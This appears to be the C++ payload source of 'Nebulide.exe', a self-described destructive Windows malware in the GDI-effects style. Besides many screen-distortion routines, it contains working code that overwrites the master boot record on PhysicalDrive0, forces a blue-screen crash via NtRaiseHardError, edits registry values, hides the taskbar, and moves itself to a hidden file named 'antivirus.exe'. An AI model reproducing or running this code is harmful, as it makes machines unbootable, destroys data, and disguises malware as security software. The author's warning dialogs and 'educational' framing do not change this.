#include "shaders.h"
using namespace Shaders;

namespace Payloads
{
    const int HDCX = GetSystemMetrics(0), HDCY = GetSystemMetrics(1);

    bool Warning() {
        LPCSTR warning1 = "You have just executed Nebulide.exe, a destructive malware that will harm your computer and leave you unable to boot back into Windows. This was created for educational, entertainment, and testing purposes only. Never run this on your PC or anyone else's for malicious purposes. It is to be used safely in a virtual machine. If you understand everything, you may click \"Yes\" to run the malware.";
        LPCSTR warning2 = "This is the last warning. Clicking \"Yes\" will start the destruction! The creator is not responsible for any damage or if you choose to use this maliciously. Do you still want to run this?";
        if (MessageBoxA(NULL, warning1, "Nebulide.exe", MB_ICONEXCLAMATION | MB_SYSTEMMODAL | MB_YESNO) == IDYES) {
            if (MessageBoxA(NULL, warning2, "Final Warning", MB_ICONEXCLAMATION | MB_SYSTEMMODAL | MB_YESNO) == IDYES) {
                return true;
            } else {
                return false;
            }
        } else {
            return false;
        }
    }

    void ClearScreen() {
        InvalidateRect(0, 0, 0);
        Sleep(300);
    }

    void TerminatePayload(HANDLE thread) {
        TerminateThread(thread, 0);
        CloseHandle(thread);
    }

    void OverwriteMBR() {
        DWORD bw;
        char data[512];
        HANDLE hMbr = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
        WriteFile(hMbr, data, 512, &bw, NULL);
        CloseHandle(hMbr);
    }

    void Regedit(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value) {
        HKEY hKey;
        DWORD dwDisposition;
        LONG result;
        
        result = RegCreateKeyExW(
            HKey,
            Subkey,
            0,
            NULL,
            REG_OPTION_NON_VOLATILE,
            KEY_ALL_ACCESS,
            NULL,
            &hKey,
            &dwDisposition
        );

        result = RegSetValueExW(
            hKey,
            ValueName,
            0,
            Type,
            (const unsigned char*)&Value,
            (int)sizeof(Value)
        );

        RegCloseKey(hKey);
    }

    void BSOD() { 
        BOOLEAN bl;
        ULONG rp;
        RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
        NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &rp);
    }

    void HideTaskbar() {
        HWND taskbar = FindWindowA("Shell_TrayWnd", NULL);
        ShowWindow(taskbar, SW_HIDE);
    }

    void MoveSelf() {
        char selfpath[MAX_PATH];
        GetModuleFileNameA(NULL, selfpath, MAX_PATH);

        if (selfpath != "C:\\Windows\\antivirus.exe") {
            MoveFileA(selfpath, "C:\\Windows\\antivirus.exe");
            SetFileAttributesA("C:\\Windows\\antivirus.exe", FILE_ATTRIBUTE_HIDDEN);
        }
    }


    DWORD WINAPI moving_pie(LPVOID) {
        int size = (HDCX+HDCY)/20, speed = 10;
        POINT tl = {rand() % HDCX, rand() % HDCY};
        POINT br;
        bool up = true, left = true;
        
        while (1) {
            HDC hdc = GetDC(0);
            HBRUSH brush = CreateSolidBrush(Hue(3));
            SelectObject(hdc, brush);
            br = {tl.x+size, tl.y+size};
            Pie(hdc, tl.x, tl.y, br.x, br.y, tl.x+size, tl.y-size, br.x+size, br.y-size);

            up ? tl.y -= speed : tl.y += speed;
            left ? tl.x -= speed : tl.x += speed;

            if (tl.y <= 0) {
                up = false;
            } else if (br.y >= HDCY) {
                up = true;
            }

            if (tl.x <= 0) {
                left = false;
            } else if (br.x >= HDCX) {
                left = true;
            }

            ReleaseDC(0, hdc); DeleteObject(brush);
            Sleep(1);
        }
    }

    DWORD WINAPI payload0(LPVOID) {
        BLENDFUNCTION blendFunc = {0, 0, 48, 0};
        int size = (HDCX+HDCY)/17;

        while (1) {
            HDC hdc = GetDC(0), memdc = CreateCompatibleDC(hdc);
            HBITMAP hbit = CreateCompatibleBitmap(hdc, HDCX, HDCY);
            (HBITMAP)SelectObject(memdc, hbit);

            BitBlt(memdc, 0, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);
            AlphaBlend(hdc, (rand() % 3) - 1, (rand() % 3) - 1, HDCX, HDCY, memdc, 0, 0, HDCX, HDCY, blendFunc);

            HBRUSH brush = CreateSolidBrush(Hue(1));
            SelectObject(memdc, brush);
            PatBlt(memdc, 0, 0, HDCX, HDCY, PATCOPY);
            DeleteObject(brush);
            AlphaBlend(hdc, rand() % HDCX, rand() % HDCY, size, size, memdc, 0, 0, size, size, blendFunc);

            int sine = rand() % 2;
            for (int y = 0; y < HDCY; y++) {
                sine == 0 ? BitBlt(hdc, 2*sin(y*0.07), y, HDCX, 1, hdc, 0, y, SRCCOPY) : BitBlt(hdc, (rand() % 5) - 2, y, HDCX, 1, hdc, 0, y, SRCCOPY);
            }

            if (rand() % 22 == 0) {
                InvalidateRect(0, 0, 0);
                Sleep(5);
                HBRUSH brush2 = CreateSolidBrush(Hue(10));
                SelectObject(hdc, brush2);
                rand() % 2 == 0 ? BitBlt(hdc, 0, 0, HDCX, HDCY, hdc, 0, 0, MERGECOPY) : PatBlt(hdc, 0, 0, HDCX, HDCY, PATINVERT);
                DeleteObject(brush2);
            }

            ReleaseDC(0, hdc); DeleteDC(memdc); DeleteObject(hbit);
        }
    }

    DWORD WINAPI payload1(LPVOID) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biWidth = HDCX;
        bmi.bmiHeader.biHeight = HDCY;

        BLENDFUNCTION blendFunc = {0, 0, 48, 0};
        PRGBQUAD pixel = {0};
        
        int size = (HDCX+HDCY)/17, t = 0, random = 4;
        
        while (1) {
            HDC hdc = GetDC(0), memdc = CreateCompatibleDC(hdc);
            HBITMAP hdib = CreateDIBSection(hdc, &bmi, 0, (void**)&pixel, 0, 0);
            SelectObject(memdc, hdib);

            BitBlt(memdc, 0, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);

            for (int i = 0; i < HDCX * HDCY; i++) {
                pixel[i].rgb += 400;
                switch (random) {
                    case 0:
                        pixel[i].rgbRed -= 10;
                        break;
                    case 1:
                        pixel[i].rgbGreen -= 10;
                        break;
                    case 2:
                        pixel[i].rgbBlue -= 10;
                        break;
                }
            } BitBlt(hdc, 0, 0, HDCX, HDCY, memdc, 0, 0, SRCCOPY);

            AlphaBlend(hdc, (rand() % 3) - 1, (rand() % 3) - 1, HDCX, HDCY, memdc, 0, 0, HDCX, HDCY, blendFunc);

            HBRUSH brush = CreateSolidBrush(Hue(1));
            SelectObject(memdc, brush);
            PatBlt(memdc, 0, 0, HDCX, HDCY, PATCOPY);
            AlphaBlend(hdc, rand() % HDCX, rand() % HDCY, size, size, memdc, 0, 0, size, size, blendFunc);
            DeleteObject(brush);
            
            BitBlt(hdc, 9*sin(t*2), -(9*cos(t*2.1)), HDCX, HDCY, hdc, 0, 0, SRCCOPY); t++;

            if (rand() % 22 == 0) {
                InvalidateRect(0, 0, 0);
                random = rand() % 4;
                Sleep(5);
            }

            ReleaseDC(0, hdc); DeleteDC(memdc); DeleteObject(hdib);
        }
    }

    DWORD WINAPI payload2(LPVOID) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biWidth = HDCX;
        bmi.bmiHeader.biHeight = HDCY;

        RGBQUAD *pixel = {0};
        HSL hslPixel;
        
        int q = 0;

        while (1) {
            HDC hdc = GetDC(0), memdc = CreateCompatibleDC(hdc);
            HBITMAP hdib = CreateDIBSection(hdc, &bmi, 0, (void**)&pixel, 0, 0);
            SelectObject(memdc, hdib);

            BitBlt(memdc, 0, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);

            for (int h = 0; h < HDCY; h++) {
                for (int w = 0; w < HDCX; w++) {
                    int i = h * HDCX + w;

                    FLOAT e = i/HDCX ^ i%HDCX+q;

                    hslPixel = rgb2hsl(pixel[i]);
                    hslPixel.h = fmod(e / 300.f + h / HDCY * .1f, 1.f);
                    pixel[i] = hsl2rgb(hslPixel);
                    pixel[i].rgbRed = i/HDCX-q ^ i%HDCX;
                }
            } BitBlt(hdc, 0, 0, HDCX, HDCY, memdc, 0, 0, SRCCOPY); q += 4;

            ReleaseDC(0, hdc); DeleteDC(memdc); DeleteObject(hdib);
        }
    }

    DWORD WINAPI payload3(LPVOID) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biWidth = HDCX;
        bmi.bmiHeader.biHeight = HDCY;

        PRGBQUAD pixel = {0};
        
        int t = 0, random = 0;
        
        while (1) {
            HDC hdc = GetDC(0), memdc = CreateCompatibleDC(hdc);
            HBITMAP hdib = CreateDIBSection(hdc, &bmi, 0, (void**)&pixel, 0, 0);
            SelectObject(memdc, hdib);

            BitBlt(memdc, 0, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);

            for (int i = 0; i < HDCX * HDCY; i++) {
                switch (random) {
                    case 0:
                        pixel[i].rgbRed += pixel[i].rgb;
                        break;
                    case 1:
                        pixel[i].rgbGreen += pixel[i].rgbBlue;
                        break;
                    case 2:
                        pixel[i].rgbBlue += pixel[i].rgb;
                        pixel[i].rgbRed += pixel[i].rgbGreen;
                        break;
                    case 3:
                        pixel[i].rgbRed += pixel[i].rgbBlue;
                        pixel[i].rgbBlue += pixel[i].rgbRed;
                        break;
                    case 4:
                        pixel[i].rgb += pixel[i].rgbBlue;
                        pixel[i].rgbBlue += pixel[i].rgbGreen;
                        break;
                    case 5:
                        pixel[i].rgbRed += pixel[i].rgbGreen;
                        pixel[i].rgbGreen += pixel[i].rgbRed;
                        break;
                }
            } BitBlt(hdc, 0, 0, HDCX, HDCY, memdc, 0, 0, SRCCOPY);

            BitBlt(hdc, 11*sin(t*2.5), -(11*cos(t*2.6)), HDCX, HDCY, hdc, 0, 0, SRCCOPY); t++;

            if (rand() % 25 == 0) {
                InvalidateRect(0, 0, 0);
                random = rand() % 6;
                Sleep(5);
            }

            int sine = rand() % 3;
            for (int y = 0; y < HDCY; y++) {
                if (sine == 0) {
                    BitBlt(hdc, 5*sin(y*0.1), y, HDCX, 1, hdc, 0, y, SRCCOPY);
                } else {
                    BitBlt(hdc, (rand() % 3) - 1, y, HDCX, 1, hdc, 0, y, SRCCOPY);
                }
            }

            ReleaseDC(0, hdc); DeleteDC(memdc); DeleteObject(hdib);
        }
    }

    DWORD WINAPI payload4(LPVOID) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biWidth = HDCX;
        bmi.bmiHeader.biHeight = HDCY;

        RGBQUAD *pixel = {0};
        HSL hslPixel;

        HICON icons[] = {LoadIcon(NULL, IDI_ERROR), LoadIcon(NULL, IDI_EXCLAMATION)};

        while (1) {
            HDC hdc = GetDC(0), memdc = CreateCompatibleDC(hdc);
            HBITMAP hdib = CreateDIBSection(hdc, &bmi, 0, (void**)&pixel, 0, 0);
            SelectObject(memdc, hdib);

            BitBlt(memdc, 0, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);

            for (int h = 0; h < HDCY; h++) {
                for (int w = 0; w < HDCX; w++) {
                    int i = h * HDCX + w;

                    FLOAT e = (w/HDCX ^ h%HDCX);

                    hslPixel = rgb2hsl(pixel[i]);
                    hslPixel.h = fmod(e / 300.f + h / HDCY * .1f, 1.f);
                    pixel[i] = hsl2rgb(hslPixel);
                }
            } BitBlt(hdc, 0, 0, HDCX, HDCY, memdc, 0, 0, SRCCOPY);

            BitBlt(hdc, 0, -HDCY+70, HDCX, HDCY, hdc, 0, 0, NOTSRCCOPY);
            BitBlt(hdc, 0, 70, HDCX, HDCY, hdc, 0, 0, SRCCOPY);
            BitBlt(hdc, -HDCX+30, 0, HDCX, HDCY, hdc, 0, 0, NOTSRCERASE);
            BitBlt(hdc, 30, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);

            DrawIcon(hdc, rand() % HDCX, rand() % HDCY, icons[rand() % 2]);

            ReleaseDC(0, hdc); DeleteDC(memdc); DeleteObject(hdib);
        }
    }

    DWORD WINAPI payload5(LPVOID) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biWidth = HDCX;
        bmi.bmiHeader.biHeight = HDCY;

        PRGBQUAD pixel = {0};

        int q = 0, random = 0;
        bool swap = true;

        while (1) {
            HDC hdc = GetDC(0), memdc = CreateCompatibleDC(hdc);
            HBITMAP hdib = CreateDIBSection(hdc, &bmi, 0, (void**)&pixel, 0, 0);
            SelectObject(memdc, hdib);

            BitBlt(memdc, 0, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);

            for (int i = 0; i < HDCX*HDCY; i++) {
                switch (random) {
                    case 0:
                        pixel[i].rgbBlue = i/HDCX ^ i%HDCX - q;
                        break;
                    case 1:
                        pixel[i].rgbGreen = i/HDCX ^ i%HDCX - q;
                        break;
                    case 2:
                        pixel[i].rgbRed = i/HDCX ^ i%HDCX - q;
                        break;
                }
            } BitBlt(hdc, 0, 0, HDCX, HDCY, memdc, 0, 0, SRCCOPY); q++;

            for (int y = 0; y < HDCY; y++) {
                swap ? BitBlt(hdc, -(6*sin(y*0.08)), y, HDCX, 1, hdc, 0, y, SRCCOPY) : BitBlt(hdc, 6*sin(y*0.08), y, HDCX, 1, hdc, 0, y, SRCCOPY);
            }

            if (rand() % 21 == 0) {
                InvalidateRect(0, 0, 0);
                swap ? swap = false : swap = true;
                random = rand() % 3;
                Sleep(5);
            }

            ReleaseDC(0, hdc); DeleteDC(memdc); DeleteObject(hdib);
        }
    }

    DWORD WINAPI payload6(LPVOID) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biWidth = HDCX;
        bmi.bmiHeader.biHeight = HDCY;

        RGBQUAD *pixel = {0};
        HSL hslPixel;
        int q = 0;
        bool swap = true;

        POINT lpPoints[3];

        while (1) {
            HDC hdc = GetDC(0), memdc = CreateCompatibleDC(hdc);
            HBITMAP hdib = CreateDIBSection(hdc, &bmi, 0, (void**)&pixel, 0, 0);
            SelectObject(memdc, hdib);

            BitBlt(memdc, 0, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);

            for (int h = 0; h < HDCY; h++) {
                for (int w = 0; w < HDCX; w++) {
                    int i = h * HDCX + w;

                    FLOAT e = (i/HDCX | i%HDCX)+q;

                    hslPixel = rgb2hsl(pixel[i]);
                    hslPixel.h = fmod(e / 300.f + h / HDCY * .1f, 1.f);
                    pixel[i] = hsl2rgb(hslPixel);
                }
            } BitBlt(hdc, 0, 0, HDCX, HDCY, memdc, 0, 0, SRCCOPY); q++;

            if (rand() % 2 == 0) {
                lpPoints[0] = {30, -30};
                lpPoints[1] = {HDCX+30, 30};
                lpPoints[2] = {-30, HDCY-30};
            } else {
                lpPoints[0] = {-30, 30};
                lpPoints[1] = {HDCX-30, -30};
                lpPoints[2] = {30, HDCY+30};
            }

            PlgBlt(hdc, lpPoints, hdc, 0, 0, HDCX, HDCY, 0, 0, 0);

            if (swap) {
                StretchBlt(hdc, -20, -20, HDCX+40, HDCY+40, hdc, 0, 0, HDCX, HDCY, SRCCOPY);
                swap = false;
            } else {
                StretchBlt(hdc, 20, 20, HDCX-40, HDCY-40, hdc, 0, 0, HDCX, HDCY, SRCCOPY);
                swap = true;
            }

            ReleaseDC(0, hdc); DeleteDC(memdc); DeleteObject(hdib);
        }
    }

    DWORD WINAPI payload6_2(LPVOID) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biWidth = HDCX;
        bmi.bmiHeader.biHeight = HDCY;

        PRGBQUAD pixel = {0};
        int random = 0, q = 0;

        while (1) {
            HDC hdc = GetDC(0), memdc = CreateCompatibleDC(hdc);
            HBITMAP hdib = CreateDIBSection(hdc, &bmi, 0, (void**)&pixel, 0, 0);
            SelectObject(memdc, hdib);

            //BitBlt(memdc, 0, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);

            for (int i = 0; i < HDCX*HDCY; i++) {
                switch (random) {
                    case 0:
                        pixel[i].rgbGreen = (i%HDCX+q ^ i/HDCX+q) + q;
                        break;
                    case 1:
                        pixel[i].rgbRed = (i%HDCX+q ^ i/HDCX+q) + q;
                        break;
                    case 2:
                        pixel[i].rgbBlue = (i%HDCX+q ^ i/HDCX+q) + q;
                        break;
                    case 3:
                        pixel[i].rgbRed = (i%HDCX+q ^ i/HDCX+q) + q;
                        pixel[i].rgbBlue = (i%HDCX+q ^ i/HDCX+q) + q;
                        break;
                    case 4:
                        pixel[i].rgbGreen = (i%HDCX+q ^ i/HDCX+q) + q;
                        pixel[i].rgbBlue = (i%HDCX+q ^ i/HDCX+q) + q;
                        break;
                    case 5:
                        pixel[i].rgbRed = (i%HDCX+q ^ i/HDCX+q) + q;
                        pixel[i].rgbGreen = (i%HDCX+q ^ i/HDCX+q) + q;
                        break;
                }
            } BitBlt(hdc, 0, 0, HDCX, HDCY, memdc, 0, 0, SRCCOPY); q+=2;

            if (rand() % 35 == 0) {
                random = rand() % 5;
            }

            ReleaseDC(0, hdc); DeleteDC(memdc); DeleteObject(hdib);
        }
    }

    DWORD WINAPI payload7(LPVOID) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biWidth = HDCX;
        bmi.bmiHeader.biHeight = HDCY;

        PRGBQUAD pixel = {0};
        
        int random = 0, size = (HDCX+HDCY)/22;
        int t = 0;
        
        while (1) {
            HDC hdc = GetDC(0), memdc = CreateCompatibleDC(hdc);
            HBITMAP hdib = CreateDIBSection(hdc, &bmi, 0, (void**)&pixel, 0, 0);
            SelectObject(memdc, hdib);

            BitBlt(memdc, 0, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);

            for (int i = 0; i < HDCX*HDCY; i++) {
                random == 0 ? pixel[i].rgb -= Hue(2) : pixel[i].rgb -= 50;
                pixel[i].rgbBlue += 10;
            } BitBlt(hdc, 0, 0, HDCX, HDCY, memdc, 0, 0, SRCCOPY);

            BitBlt(hdc, 0, 11*sin(t*0.8), HDCX, HDCY, hdc, 0, 0, SRCCOPY); t++;

            switch (random) {
                case 0:
                    for (int y = 0; y < HDCY; y += size) {
                        for (int x = 0; x < HDCX; x += size) {
                            BitBlt(hdc, x+(rand() % 5) - 2, y+(rand() % 5) - 2, size, size, hdc, x, y, SRCCOPY);
                        }
                    }
                    break;
                case 1:
                    for (int x = 0; x < HDCX; x++) {
                        BitBlt(hdc, x, 3*sin(x*0.05), 1, HDCY, hdc, x, 0, SRCCOPY);
                    }
                    break;
            }

            if (rand() % 25 == 0) {
                InvalidateRect(0, 0, 0);
                random = rand() % 2;
                Sleep(5);
                HBRUSH brush = CreateSolidBrush(Hue(1));
                SelectObject(hdc, brush);
                BitBlt(hdc, 0, 0, HDCX, HDCY, hdc, 0, 0, MERGECOPY);
                DeleteObject(brush);
            }

            ReleaseDC(0, hdc); DeleteDC(memdc); DeleteObject(hdib);
        }
    }

    DWORD WINAPI payload8(LPVOID) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biWidth = HDCX;
        bmi.bmiHeader.biHeight = HDCY;

        BLENDFUNCTION blendFunc = {0, 0, 48, 0};
        PRGBQUAD pixel = {0};
        int random = 0, t = 0;
        int size = (HDCX+HDCY)/17;
       
        while (1) {
            HDC hdc = GetDC(0), memdc = CreateCompatibleDC(hdc);
            HBITMAP hdib = CreateDIBSection(hdc, &bmi, 0, (void**)&pixel, 0, 0);
            SelectObject(memdc, hdib);

            BitBlt(memdc, 0, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);

            for (int i = 0; i < HDCX*HDCY; i++) {
                switch (random) {
                    case 0:
                        pixel[i].rgbRed += 10;
                        pixel[i].rgbBlue += i%HDCX ^ i/HDCY;
                        break;
                    case 1:
                        pixel[i].rgbRed += pixel[i].rgbBlue;
                        pixel[i].rgb += 5;
                        break;
                    case 2:
                        pixel[i].rgbGreen += pixel[i].rgbRed;
                        break;
                }
            } BitBlt(hdc, 0, 0, HDCX, HDCY, memdc, 0, 0, SRCCOPY);

            BitBlt(hdc, 15*sin(t*2.8), -(15*cos(t*2.9)), HDCX, HDCY, hdc, 0, 0, SRCCOPY); t++;

            HBRUSH brush = CreateSolidBrush(Hue(2));
            SelectObject(memdc, brush);
            PatBlt(memdc, 0, 0, HDCX, HDCY, PATCOPY);
            AlphaBlend(hdc, rand() % HDCX, rand() % HDCY, size, size, memdc, 0, 0, size, size, blendFunc);
            DeleteObject(brush);
            
            PatBlt(hdc, rand() % HDCX, rand() % HDCY, size, size, PATINVERT);

            for (int y = 0; y < HDCY; y++) {
                BitBlt(hdc, (rand() % 5) - 2, y, HDCX, 1, hdc, 0, y, SRCCOPY);
            }

            if (rand() % 25 == 0) {
                InvalidateRect(0, 0, 0);
                Sleep(5);
                HBRUSH brush2 = CreateSolidBrush(Hue(5));
                SelectObject(hdc, brush2);
                BitBlt(hdc, 0, 0, HDCX, HDCY, hdc, 0, 0, MERGECOPY);
                DeleteObject(brush2);
            }

            ReleaseDC(0, hdc); DeleteDC(memdc); DeleteObject(hdib);
        }
    }

    DWORD WINAPI payload9(LPVOID) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biWidth = HDCX;
        bmi.bmiHeader.biHeight = HDCY;

        PRGBQUAD pixel = {0};
        BLENDFUNCTION blendFunc = {0, 0, 48, 0};
        int random = 0;
        
        while (1) {
            HDC hdc = GetDC(0), memdc = CreateCompatibleDC(hdc);
            HBITMAP hdib = CreateDIBSection(hdc, &bmi, 0, (void**)&pixel, 0, 0);
            SelectObject(memdc, hdib);

            BitBlt(memdc, 0, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);

            AlphaBlend(hdc, (rand() % 3) - 1, (rand() % 3) - 1, HDCX, HDCY, memdc, 0, 0, HDCX, HDCY, blendFunc);

            for (int i = 0; i < HDCX*HDCY; i++) {
                switch (random) {
                    case 0:
                        pixel[i].rgb += 50;
                        pixel[i].rgbGreen += 30;
                        break;
                    case 1:
                        pixel[i].rgbBlue += i%HDCX ^ i/HDCX;
                        pixel[i].rgb -= 10;
                        break;
                    case 2:
                        pixel[i].rgbBlue += 10;
                        pixel[i].rgbGreen += 10;
                        pixel[i].rgbRed += 10;
                        break;
                }
            } BitBlt(hdc, 0, 0, HDCX, HDCY, memdc, 0, 0, SRCCOPY);

            BitBlt(hdc, HDCX-50, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);
            BitBlt(hdc, -50, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);
            BitBlt(hdc, 0, -HDCY+30, HDCX, HDCY, hdc, 0, 0, SRCCOPY);
            BitBlt(hdc, 0, 30, HDCX, HDCY, hdc, 0, 0, SRCCOPY);

            int sine = rand() % 2;
            for (int x = 0; x < HDCX; x++) {
                if (sine == 0) {
                    BitBlt(hdc, x, -(4*sin(x*0.04)), 1, HDCY, hdc, x, 0, SRCCOPY);
                } else {
                    BitBlt(hdc, x, (rand() % 3) - 1, 1, HDCY, hdc, x, 0, SRCCOPY);
                }
            }

            if (rand() % 30 == 0) {
                random = rand() % 3;
                Sleep(5);
            }

            ReleaseDC(0, hdc); DeleteDC(memdc); DeleteObject(hdib);
        }
    }

    DWORD WINAPI payload10(LPVOID) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biWidth = HDCX;
        bmi.bmiHeader.biHeight = HDCY;
        
        PRGBQUAD pixel = {0};
        POINT lpPoints[3];
        BLENDFUNCTION blendFunc = {0, 0, 115, 0};
        int random = 0;
        int size = (HDCX+HDCY)/17;

        while(1) {
            HDC hdc = GetDC(0), memdc = CreateCompatibleDC(hdc);
            HBITMAP hdib = CreateDIBSection(hdc, &bmi, 0, (void**)&pixel, 0, 0);
            SelectObject(memdc, hdib);

            BitBlt(memdc, 0, 0, HDCX, HDCY, hdc, 0, 0, SRCCOPY);

            for (int i = 0; i < HDCX*HDCY; i++) {
                switch (random) {
                    case 0:
                        pixel[i].rgbBlue += i%HDCX ^ i/HDCX;
                        pixel[i].rgbGreen += i%HDCX ^ i/HDCX;
                        pixel[i].rgbRed += i%HDCX ^ i/HDCX;
                        break;
                    case 1:
                        pixel[i].rgb += 60;
                        break;
                    case 2:
                        pixel[i].rgb -= 60;
                        break;
                    case 3:
                        pixel[i].rgbRed += pixel[i].rgbBlue;
                        pixel[i].rgbBlue += pixel[i].rgbRed;
                        break;
                }
            } BitBlt(hdc, 0, 0, HDCX, HDCY, memdc, 0, 0, SRCCOPY);

            int sine = rand() % 2;
            for (int y = 0; y < HDCY; y++) {
                sine == 0 ? BitBlt(hdc, 5*sin(y*0.04), y, HDCX, 1, hdc, 0, y, SRCCOPY) : BitBlt(hdc, (rand() % 3) - 1, y, HDCX, 1, hdc, 0, y, SRCCOPY);
            }

           if (rand() % 2 == 0) {
                lpPoints[0] = {30, -30};
                lpPoints[1] = {HDCX+30, 30};
                lpPoints[2] = {-30, HDCY-30};
            } else {
                lpPoints[0] = {-30, 30};
                lpPoints[1] = {HDCX-30, -30};
                lpPoints[2] = {30, HDCY+30};
            }

            PlgBlt(hdc, lpPoints, hdc, 0, 0, HDCX, HDCY, 0, 0, 0);

            PatBlt(memdc, 0, 0, HDCX, HDCY, WHITENESS);
            AlphaBlend(hdc, rand() % HDCX, rand() % HDCY, size, size, memdc, 0, 0, size, size, blendFunc);

            if (rand() % 30 == 0) {
                InvalidateRect(0, 0, 0);
                random = rand() % 4;
                Sleep(5);
            }

            ReleaseDC(0, hdc); DeleteDC(memdc); DeleteObject(hdib);
        }
    }
} 